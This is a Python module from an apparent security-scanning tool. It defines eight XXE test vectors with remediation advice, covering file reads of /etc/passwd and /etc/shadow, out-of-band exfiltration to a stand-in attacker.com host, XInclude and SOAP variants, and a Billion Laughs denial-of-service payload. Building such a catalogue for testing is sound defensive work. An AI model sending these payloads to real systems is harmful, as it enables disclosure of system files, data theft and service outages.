"""
XML External Entity (XXE) Testing Vectors
Classic XXE, Blind XXE, OOB XXE, various XML contexts
"""

from ..models import (
    TestVector, VulnerabilityType, TestVectorPosition as Position, PositionType,
    TestVectorPayload as PayloadTemplate, TestVectorEvidence as Evidence, 
    ConfidenceLevel, SensitivityLevel
)

XXE_VECTORS = [
    TestVector(
        id="xxe-classic-001",
        name="Classic XXE File Read",
        description="Read local files via XML external entity",
        vuln_type=VulnerabilityType.XXE,
        position=Position(type=PositionType.BODY_XML, name="xml", value_prefix="", value_suffix=""),
        payload=PayloadTemplate(
            base='<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>',
            variants=[
                '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>',
                '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/shadow">]><root>&xxe;</root>',
                '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]><root>&xxe;</root>'
            ],
            encoding="none"
        ),
        expected_evidence=Evidence(
            indicators=["File contents in response", "/etc/passwd exposed", "XXE successful"],
            confidence=ConfidenceLevel.CRITICAL
        ),
        sensitivity=SensitivityLevel.CRITICAL,
        remediation="Disable external entities in XML parser. Use defusedxml library. Validate XML input.",
        references=["https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing"],
        tags=["xxe", "file-read", "classic"]
    ),
    
    TestVector(
        id="xxe-blind-001",
        name="Blind XXE with External DTD",
        description="Blind XXE using external DTD",
        vuln_type=VulnerabilityType.XXE_BLIND,
        position=Position(type=PositionType.BODY_XML, name="data", value_prefix="", value_suffix=""),
        payload=PayloadTemplate(
            base='<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd"> %xxe;]><root></root>',
            variants=[
                '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd"> %xxe;]><root></root>',
                '<?xml version="1.0"?><!DOCTYPE root SYSTEM "http://attacker.com/evil.dtd"><root></root>'
            ],
            encoding="none"
        ),
        expected_evidence=Evidence(
            indicators=["HTTP request to attacker domain", "External DTD loaded", "OOB interaction"],
            confidence=ConfidenceLevel.HIGH
        ),
        sensitivity=SensitivityLevel.HIGH,
        remediation="Disable external entities and DTD loading. Block outbound connections from parser.",
        references=["https://portswigger.net/web-security/xxe/blind"],
        tags=["xxe", "blind", "out-of-band"]
    ),
    
    TestVector(
        id="xxe-oob-001",
        name="Out-of-Band XXE Data Exfiltration",
        description="Exfiltrate data via OOB XXE",
        vuln_type=VulnerabilityType.XXE_OOB,
        position=Position(type=PositionType.BODY_XML, name="xml", value_prefix="", value_suffix=""),
        payload=PayloadTemplate(
            base='<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % file SYSTEM "file:///etc/passwd"><!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd"> %dtd;]><root>&send;</root>',
            variants=[
                '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % file SYSTEM "file:///etc/passwd"><!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd"> %dtd;]><root>&send;</root>'
            ],
            encoding="none"
        ),
        expected_evidence=Evidence(
            indicators=["File data in HTTP request", "OOB exfiltration", "Data in DNS query"],
            confidence=ConfidenceLevel.HIGH
        ),
        sensitivity=SensitivityLevel.CRITICAL,
        remediation="Disable external entities. Block all outbound connections. Use safe XML parsers.",
        references=["https://portswigger.net/web-security/xxe/blind"],
        tags=["xxe", "oob", "exfiltration"]
    ),
    
    TestVector(
        id="xxe-soap-001",
        name="XXE in SOAP Request",
        description="XXE attack via SOAP XML",
        vuln_type=VulnerabilityType.XXE,
        position=Position(type=PositionType.BODY_XML, name="soap", value_prefix="", value_suffix=""),
        payload=PayloadTemplate(
            base='<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"><soap:Body>&xxe;</soap:Body></soap:Envelope>',
            variants=[
                '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"><soap:Body>&xxe;</soap:Body></soap:Envelope>'
            ],
            encoding="none"
        ),
        expected_evidence=Evidence(
            indicators=["File read via SOAP", "XXE in SOAP body", "Sensitive data exposed"],
            confidence=ConfidenceLevel.HIGH
        ),
        sensitivity=SensitivityLevel.CRITICAL,
        remediation="Disable external entities in SOAP parser. Validate SOAP messages. Use safe XML libraries.",
        references=["https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing"],
        tags=["xxe", "soap", "web-services"]
    ),
    
    TestVector(
        id="xxe-xinclude-001",
        name="XXE via XInclude",
        description="XXE using XInclude to include external files",
        vuln_type=VulnerabilityType.XXE,
        position=Position(type=PositionType.BODY_XML, name="data", value_prefix="", value_suffix=""),
        payload=PayloadTemplate(
            base='<root xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></root>',
            variants=[
                '<root xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></root>',
                '<root xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="http://attacker.com/evil.txt"/></root>'
            ],
            encoding="none"
        ),
        expected_evidence=Evidence(
            indicators=["XInclude processed", "External file included", "File content in response"],
            confidence=ConfidenceLevel.HIGH
        ),
        sensitivity=SensitivityLevel.HIGH,
        remediation="Disable XInclude processing. Use XML parser without XInclude support.",
        references=["https://portswigger.net/web-security/xxe"],
        tags=["xxe", "xinclude", "file-inclusion"]
    ),
    
    TestVector(
        id="xxe-docx-001",
        name="XXE via DOCX Upload",
        description="XXE through malicious DOCX file",
        vuln_type=VulnerabilityType.XXE_FILE_UPLOAD,
        position=Position(type=PositionType.BODY_MULTIPART, name="file", value_prefix="", value_suffix=""),
        payload=PayloadTemplate(
            base="malicious.docx",
            variants=["malicious.docx", "malicious.xlsx", "malicious.pptx"],
            encoding="binary"
        ),
        expected_evidence=Evidence(
            indicators=["DOCX parsed", "XXE triggered during processing", "File read successful"],
            confidence=ConfidenceLevel.HIGH
        ),
        sensitivity=SensitivityLevel.HIGH,
        remediation="Disable external entities in Office document parsers. Scan uploads. Use sandboxing.",
        references=["https://blog.h3xstream.com/2014/09/xxe-injection-in-office-open-xml.html"],
        tags=["xxe", "docx", "file-upload", "office"]
    ),
    
    TestVector(
        id="xxe-parameter-entities-001",
        name="XXE with Parameter Entities",
        description="XXE using parameter entities for bypass",
        vuln_type=VulnerabilityType.XXE,
        position=Position(type=PositionType.BODY_XML, name="xml", value_prefix="", value_suffix=""),
        payload=PayloadTemplate(
            base='<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % xxe SYSTEM "file:///etc/passwd"> <!ENTITY % payload "<!ENTITY &#x25; send SYSTEM \'http://attacker.com/?data=%xxe;\'> &#x25;send; ">%payload;]><root></root>',
            variants=[
                '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % xxe SYSTEM "file:///etc/passwd"> <!ENTITY % payload "<!ENTITY &#x25; send SYSTEM \'http://attacker.com/?data=%xxe;\'> &#x25;send; ">%payload;]><root></root>'
            ],
            encoding="none"
        ),
        expected_evidence=Evidence(
            indicators=["Parameter entity processed", "Data exfiltrated", "Complex XXE successful"],
            confidence=ConfidenceLevel.MEDIUM
        ),
        sensitivity=SensitivityLevel.HIGH,
        remediation="Disable parameter entities. Disable external entity processing completely.",
        references=["https://portswigger.net/web-security/xxe"],
        tags=["xxe", "parameter-entities", "advanced"]
    ),
    
    TestVector(
        id="xxe-billion-laughs-001",
        name="XXE Billion Laughs DoS",
        description="DoS via exponential entity expansion (Billion Laughs)",
        vuln_type=VulnerabilityType.XXE,
        position=Position(type=PositionType.BODY_XML, name="xml", value_prefix="", value_suffix=""),
        payload=PayloadTemplate(
            base='<?xml version="1.0"?><!DOCTYPE lolz [<!ENTITY lol "lol"><!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;"><!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">]><lolz>&lol3;</lolz>',
            variants=[
                '<?xml version="1.0"?><!DOCTYPE lolz [<!ENTITY lol "lol"><!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;"><!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">]><lolz>&lol3;</lolz>'
            ],
            encoding="none"
        ),
        expected_evidence=Evidence(
            indicators=["Memory exhaustion", "CPU spike", "Parser DoS", "Server unresponsive"],
            confidence=ConfidenceLevel.HIGH
        ),
        sensitivity=SensitivityLevel.MEDIUM,
        remediation="Limit entity expansion depth. Set parser resource limits. Disable entity expansion.",
        references=["https://en.wikipedia.org/wiki/Billion_laughs_attack"],
        tags=["xxe", "dos", "billion-laughs", "entity-expansion"]
    ),
]

# Total vectors: 8
